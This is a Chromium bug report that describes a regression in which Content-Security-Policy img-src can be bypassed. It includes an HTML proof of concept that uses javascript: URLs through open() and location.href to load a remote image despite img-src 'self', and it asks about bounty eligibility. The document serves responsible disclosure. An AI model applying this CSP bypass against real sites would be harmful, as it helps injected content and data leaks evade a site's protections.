@@ -1,0 +1,52 @@
+UserAgent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.80 Safari/537.36
+
+Steps to reproduce the problem:
+Same as the issue I submitted earlier:
+
+https://bugs.chromium.org/p/chromium/issues/detail?id=671271
+
+I submitted this issue in 2016 , and In 62.0.3197.0, you landed the fix.
+but in 75.0.3770.80 this security issue can be reproduced again.
+
+how to reproduce:
+
+Edit an html file like this
+
+```
+<html>
+<meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-inline' 'self';img-src 'self'"/>
+<body>
+<button onclick="breakit1()">CSP TEST1</button>
+<button onclick="breakit2()">CSP TEST2</button>
+<script>
+    function breakit1(){
+        open("javascript:'<img src=https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png>'","_self");
+    }
+
+    function breakit2(){
+
+        location.href="javascript:'<img src=https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png>'";
+    }
+</script>
+
+</body>
+</html>
+```
+
+Click the button and you will find that the image was successfully loaded.
+Content-Security-Policy img-src directive is set to 'self'.
+
+What is the expected behavior?
+Content security Policy block this image
+
+What went wrong?
+remote image is loaded
+
+Did this work before? N/A
+
+Chrome version: 75.0.3770.80  Channel: n/a
+OS Version: OS X 10.14.3
+Flash Version:
+
+Will the issue I submitted this time satisfy your bug bounty?
+The issue(671271) I submitted earlier(2016) was duplicated by 756040  which submitted later (2017),and I lose my first CVE..
